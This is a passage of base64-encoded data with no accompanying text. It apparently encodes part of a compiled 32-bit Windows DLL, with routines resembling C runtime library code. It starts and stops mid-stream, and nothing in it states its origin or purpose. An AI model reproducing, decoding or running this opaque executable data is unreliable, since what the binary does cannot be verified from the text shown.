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cCAADR6w+v3wPZU1GLzomd8P7///8VROEAEP/Wg8QIhcB+EFdT/7X8/v//6Oj+//+DxAz/tQj///+Lzv+1/P7///8VROEAEP/Wg8QIhcB+FVf/tQj/////tfz+///otv7//4PEDP+1CP///4vOU/8VROEAEP/Wg8QIhcB+EFf/tQj///9T6I7+//+DxAyLhQj///+L+Iu1/P7//4uVBP///4mF7P7//5A73nY3A/KJtfT+//8783Mli40A////U1b/FUThABD/lQD///+LlQT///+DxAiFwH7TO953PYuFCP///4u9AP///wPyO/B3H1NWi8//FUThABD/14uVBP///4PECIXAi4UI////ftuLvez+//+JtfT+//+LtQD////rBo2bAAAAAIuVBP///yv6O/t2GVNXi87/FUThABD/1oPECIXAf+GLlQT///+LtfT+//+Jvez+//87/nJeiZXo/v//ib3k/v//O/d0M4vei9eLtej+//8r34oCjVIBikwT/4hEE/+ISv+D7gF164u19P7//4ud8P7//4uVBP///4uFCP///zvfD4X6/v//i96JnfD+///p7f7//wP6O99zMo2kJAAAAAAr+jv7diWLjQD///9TV/8VROEAEP+VAP///4uVBP///4PECIXAdNk733Ivi7UA////K/o7vfz+//92GVNXi87/FUThABD/1ouVBP///4PECIXAdN2LtfT+//+LlQj///+Lx4ud/P7//4vKK84rwzvBfDk733MYi4X4/v//iZyFDP///4l8hYRAiYX4/v//i70E////O/JzTIvOi7UA////iY38/v//6Wr9//878nMYi4X4/v//ibSFDP///4lUhYRAiYX4/v//i438/v//i7UA////O89zFYvXi70E////6Sv9//+LtQD////rBou9BP///4uF+P7//4PoAYmF+P7//3gWi4yFDP///4tUhYSJjfz+///p9vz//1uLTfxfM81e6L+O//+L5V3Di/9Vi+xRi1UUi00IVoXSdQ2FyXUNOU0MdSEzwOsuhcl0GYtFDIXAdBKF0nUEiBHr6Yt1EIX2dRnGAQDoR97//2oWXokw6IHd//+Lxl6L5V3DUyvxi9hXi/mD+v91EYoEPogHR4TAdCWD6wF18eseigQ+iAdHhMB0CoPrAXQFg+oBdeyF0otVFHUDxgcAX4XbW3WHg/r/dQ2LRQxqUMZEAf8AWOunxgEA6Nrd//9qIuuRi/9Vi+xd6UT////MzMzMzMzMzMzMVYvsVjPAUFBQUFBQUFCLVQyNSQCKAgrAdAmDwgEPqwQk6/GLdQiL/4oGCsB0DIPGAQ+jBCRz8Y1G/4PEIF7Jw4v/VYvsagD/dQz/dQjoBQAAAIPEDF3Di/9Vi+yD7BCDfQgAdRToV93//8cAFgAAAOiQ3P//M8DrZ1aLdQyF9nUS6Dvd///HABYAAADodNz//+sFOXUIcgQzwOtD/3UQjU3w6OnP//+LVfiDeggAdByNTv9JOU0IdwoPtgH2RBAZBHXwi8YrwYPgASvwToB9/AB0CotN8IOhUAMAAP2Lxl6L5V3D6HPm//8zyYTAD5TBi8HDi/9Vi+yD7BihJEABEDPFiUX8U1ZX/3UIjU3o6H3P//+LTRyFyXULi0Xsi0AIi8iJRRwzwDP/OUUgV1f/dRQPlcD/dRCNBMUBAAAAUFH/FTjgABCJRfiFwA+EmQAAAI0cAI1LCDvZG8CFwXRKjUsIO9kbwCPBjUsIPQAEAAB3GTvZG8AjwehTk///i/SF9nRgxwbMzAAA6xk72RvAI8FQ6AvO//+L8FmF9nRFxwbd3QAAg8YI6wKL94X2dDRTV1boqa3//4PEDP91+Fb/dRT/dRBqAf91HP8VOOAAEIXAdBD/dRhQVv91DP8V/OAAEIv4VugnAAAAWYB99AB0CotF6IOgUAMAAP2Lx41l3F9eW4tN/DPN6OmL//+L5V3Di/9Vi+yLRQiFwHQSg+gIgTjd3QAAdQdQ6DvN//9ZXcOL/1WL7FFRoSRAARAzxYlF/FNWi3UYV4X2fhRW/3UU6OoKAABZO8ZZjXABfAKL8It9JIX/dQuLRQiLAIt4CIl9JDPAOUUoagBqAFb/dRQPlcCNBMUBAAAAUFf/FTjgABCJRfiFwA+EjQEAAI0UAI1KCDvRG8CFwXRSjUoIO9EbwCPBjUoIPQAEAAB3HTvRG8AjwegJkv//i9yF2w+ETAEAAMcDzMwAAOsdO9EbwCPBUOi9zP//i9hZhdsPhC0BAADHA93dAACDwwjrAjPbhdsPhBgBAAD/dfhTVv91FGoBV/8VOOAAEIXAD4T/AAAAi334M8BQUFBQUFdT/3UQ/3UM6D/W//+L8IX2D4TeAAAA90UQAAQAAHQ4i0UghcAPhMwAAAA78A+PwgAAADPJUVFRUP91HFdT/3UQ/3UM6APW//+L8IX2D4WkAAAA6Z0AAACNFDaNSgg70RvAhcF0So1KCDvRG8AjwY1KCD0ABAAAdxk70RvAI8HoJJH//4v8hf90ZMcHzMwAAOsZO9EbwCPBUOjcy///i/hZhf90SccH3d0AAIPHCOsCM/+F/3Q4agBqAGoAVlf/dfhT/3UQ/3UM6H/V//+FwHQdM8BQUDlFIHU6UFBWV1D/dST/FTzgABCL8IX2dS5X6PT9//9ZM/ZT6Ov9//9Zi8aNZexfXluLTfwzzei9if//i+Vdw/91IP91HOvAV+jG/f//WevSi/9Vi+yD7BD/dQiNTfDoMMz///91KI1F9P91JP91IP91HP91GP91FP91EP91DFDor/3//4PEJIB9/AB0CotN8IOhUAMAAP2L5V3Di/9Vi+yDfQgAdRXoGdn//8cAFgAAAOhS2P//g8j/XcP/dQhqAP81AIsBEP8VAOEAEF3Di/9Vi+xXi30Ihf91C/91D